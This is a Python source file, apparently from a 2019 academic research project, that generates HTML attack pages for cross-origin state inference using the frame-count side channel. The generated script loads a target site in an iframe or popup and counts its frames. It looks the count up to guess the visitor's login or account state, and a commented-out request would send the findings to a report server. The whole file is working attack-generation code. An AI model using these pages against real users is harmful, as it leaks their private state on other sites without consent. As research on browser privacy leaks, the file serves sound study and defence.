# -*- coding: utf-8 -*-

"""
	Copyright (C) 2019  Soheil Khodayari, IMDEA Software
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.
	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	Description:
	---------------
	Attack Page Generator Class for CW (Frame Count)

"""


# ----------------------------------------------------------------------- #
#                  CW Attack Page Generator Class
# ----------------------------------------------------------------------- #

import json

class CWAttackPageGenerator(object):
    """
        a pluggable HTML attack page generator class for COSI attacks
    """
    def __init__(self, uuid, ef_apg, **kwargs):
        self._uuid = uuid 
        for key in kwargs:
            setattr(self, key, kwargs[key])

        self._ef_apg = ef_apg  # re-use the same EF methods

    def __unicode__(self):
        return 'CW-APG ID-%s'%str(self._uuid)

    def __str__(self):
        return 'CW-APG ID-%s'%str(self._uuid)

    def __repr__(self):
        return 'CW-APG ID-%s'%str(self._uuid)

    def _get_cw_collection_delay(self, mode):
        if mode == "frame":
            return "6000"
        return "10000" #mili-seconds

    # ----------------------------------------------------------------------- #
    #                   Common Public Methods
    # ----------------------------------------------------------------------- #

    def getID(self):
        return self._uuid

    # ----------------------------------------------------------------------- #
    #                   Common Private Methods
    # ----------------------------------------------------------------------- #

    def get_cw_attack_page_multiple_inclusion(self, ks, report_uri):
        document_title = "CW_Page"
        _ef_apg_instance = self._ef_apg

        ks_include = ks["IncludeME"]
        cw_ks_lookup = ks["CW"]["LookupME"]
        idx = 0
        ks_cw_lookup_string = _ef_apg_instance._convert_dict_to_string(cw_ks_lookup)
        html = _ef_apg_instance._get_base_dom_document(document_title)    
        #html = self._attack_cw_console_state_printer(html)  
        for inclusion_url in ks_include:
            idx = idx + 1
            tag_uuid = idx
            html = self._attach_cw_log_collector(html, inclusion_url, tag_uuid, mode="frame") 
            html = self._attach_cw_log_collector(html, inclusion_url, tag_uuid, mode="window") 
            html = self._attach_ef_log_sender(html, inclusion_url, tag_uuid, report_uri, ks_cw_lookup_string)

        return html

    def _attack_cw_console_state_printer(self, html, include_in_head = False):
        js = '''
        <script type="text/javascript">

            var PrintOPState = function(props, o, table){
                var lookup = JSON.parse(table);
                var target_url = o.target_url;
                var tag = o.tag;

                var desired_lookup_tbl = lookup[target_url][tag];
                var lookup_keys = Object.keys(desired_lookup_tbl);
                // console.log(lookup_keys);

                var key_values_strlist = [];
                for (var prop in props){
                    key_values_strlist.push(""+prop+":"+props[prop]);
                }
                // console.log(key_values_strlist);
                
                
                for(var idx=0; idx< key_values_strlist.length; idx++){
                    var element = key_values_strlist[idx].replace(/\"/g,"");
                    key_values_strlist[idx] = element;
                    if(lookup_keys.includes(element)){
                        console.log("[OP] Possible_State: "+desired_lookup_tbl[element])
                    }
                }

            }
            window.PrintOPState = PrintOPState;
        </script>
        '''
        if include_in_head:
            returnHTML = self._ef_apg._include_tag_in_head(html, js)
        else:
            returnHTML = self._ef_apg._include_tag_in_body(html, js)
        return returnHTML

    # @param mode: possible values are 'frame' and 'window'
    def _attach_cw_log_collector(self, html, target_url, tag_uuid, mode="frame"):
        delay = self._get_cw_collection_delay(mode)
        if mode == "frame":
            js = '''
            <script type="text/javascript">
                var tag = document.createElement("iframe");
                tag.setAttribute("src", "%s");
                window.tag%s = tag;
            '''%(target_url, tag_uuid)
            endJs = ''' 
                    document.body.appendChild(tag);
                    setTimeout(function() {
                            postContentWindowResults({"iframe": tag });
                            }, %s);
                    </script>
                    '''%delay
            js = js + endJs
        else:
            js = '''
            <script type="text/javascript">
            var url =  "%s";
            window.wp_spawned%s = window.open(url, "_blank");
            setTimeout(function() {
                    window.frameCount%s = window.wp_spawned%s.length;
                    var cnt = window.frameCount%s;
                    window.wp_spawned%s.close();
                    postContentWindowResults({"frameCount": cnt });
                }, %s);
            </script>
            '''%(target_url, tag_uuid, tag_uuid, tag_uuid, tag_uuid, tag_uuid, delay)

        returnHTML = self._ef_apg._include_tag_in_body(html, js)
        return returnHTML


    def _attach_ef_log_sender(self, html, target_url, tag_uuid, report_uri, ks_lookup_string):
        js = '''
            <script type="text/javascript">
            var postContentWindowResults = function(obj){
                var count = 0;
                if(obj.hasOwnProperty("frameCount")){
                    count = obj["frameCount"];
                }else {
                    /// obj is a ref to iframe tag
                    var iframe = obj["iframe"];
                    count = iframe.contentWindow.length;
                }

                var logMessage = {
                    "target_url": "%s", 
                    "tag_uuid": "%s", 
                    "frame_count": JSON.stringify(count),
                    "ks_lookup": JSON.stringify(%s),
                }
                var ks = JSON.parse(logMessage.ks_lookup);
                var states = ks[logMessage.target_url][logMessage.frame_count];
                console.log("[CW] Possible States: "+ states);
                    // request = $.ajax({
                    //         url: "%s",
                    //         contentType: "application/json; charset=utf-8",
                    //         type: "post",
                    //         data: JSON.stringify(logMessage),
                    //         dataType: 'text',
                    //         crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //         console.log("message sent to log server");
                    //         console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //         console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
            </script>
        '''%(target_url, tag_uuid, ks_lookup_string, report_uri)

        returnHTML = self._ef_apg._include_tag_in_body(html, js)
        return returnHTML